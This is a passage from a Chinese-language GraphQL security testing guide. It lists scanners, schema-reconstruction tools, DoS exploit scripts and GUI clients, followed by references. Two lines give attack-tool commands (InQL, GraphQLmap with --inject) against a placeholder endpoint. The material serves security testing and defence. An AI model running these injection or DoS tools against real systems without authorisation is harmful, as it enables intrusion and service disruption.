| **依赖版本** | 监控并更新 GraphQL 引擎库版本（graphql-java、Apollo、async-graphql 等） |

---

## 工具集

### 漏洞扫描与安全审计

| 工具 | 用途 |
|------|------|
| [graphql-cop](https://github.com/dolevf/graphql-cop) | GraphQL 端点常见错误配置安全扫描 |
| [batchql](https://github.com/assetnote/batchql) | 专注于批量查询和 Mutation 的审计脚本 |
| [graphw00f](https://github.com/dolevf/graphw00f) | GraphQL 引擎指纹识别 |
| [GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler) | Schema 抓取、敏感数据搜索、授权测试、暴力破解、路径发现 |
| [InQL](https://github.com/doyensec/inql) | Burp Suite 扩展 — Scanner（自动生成所有查询和 Mutation）+ Attacker（批量攻击）: `python3 inql.py -t http://example.com/graphql -o output.json` |
| [GQLSpection](https://github.com/doyensec/GQLSpection) | InQL 独立/CLI 模式的继任者 |
| [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) | CLI 客户端 + 攻击自动化: `python3 graphqlmap.py -u http://example.com/graphql --inject` |
| [graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) | 枚举到达指定 GraphQL 类型的所有路径 |

### Schema 重建（无 Introspection）

| 工具 | 用途 |
|------|------|
| [clairvoyance](https://github.com/nikitastupin/clairvoyance) | 基于引擎建议错误消息反向重建 schema |
| [GraphQuail](https://github.com/forcesunseen/graphquail) | Burp 扩展 — 被动观察流量构建内部 schema + 虚假 introspection 响应 |

### DoS 利用脚本

| 工具 | 用途 |
|------|------|
| [GraphQLDoS](https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS) | GraphQL DoS 利用脚本集合 |

### GUI 客户端

- [GraphiQL](https://github.com/graphql/graphiql)
- [Altair](https://altair.sirmuel.design/)
- [GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager) — Schema 交互式关系图

---

## 参考资料

- [PortSwigger — Web Security: GraphQL](https://portswigger.net/web-security/graphql)
- [PayloadsAllTheThings — GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix)
- [Jon Dow — Practical GraphQL Attack Vectors](https://jondow.eu/practical-graphql-attack-vectors/)
- [Doyensec — GraphQL CSRF](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)
- [Doyensec — GraphQL Scanner (InQL)](https://blog.doyensec.com/2020/03/26/graphql-scanner.html)
- [Doyensec — InQL v6.1 Release](https://blog.doyensec.com/2025/12/02/inql-v610.html)
- [Wallarm — GraphQL Batching Attack](https://lab.wallarm.com/graphql-batching-attack/)
- [Landh.tech — Google Hack $50,000 (Directive Overloading)](https://www.landh.tech/blog/20240304-google-hack-50000/)
- [ForcesUnseen — GraphQL Security Testing Without a Schema](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)
- [Bilal Rizwan — GraphQL Common Vulnerabilities (Medium)](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [APKash — GraphQL vs REST Security (Medium)](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [GhostLulz — API Hacking: GraphQL](http://ghostlulz.com/api-hacking-graphql/)
- [TheB10g — GraphQL Query Authentication Bypass](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)
- [HackerOne Report #792927 — GraphQL Authorization Bypass](https://hackerone.com/reports/792927)
- [GHSA-5gc2-7c65-8fq8 — Security Advisory](https://github.com/advisories/GHSA-5gc2-7c65-8fq8)
- [graphql-armor — Defensive Middleware](https://github.com/escape-tech/graphql-armor)
- [graphql-wordlist — Entity Discovery Wordlist](https://github.com/Escape-Technologies/graphql-wordlist)
- [GraphQL Spec — Introspection](https://graphql.org/learn/introspection/)
- [AutoGraphQL (YouTube)](https://www.youtube.com/watch?v=JJmufWfVvyU)
- [Bypassing GraphQL Defenses (YouTube)](https://www.youtube.com/watch?v=tIo_t5uUK50)
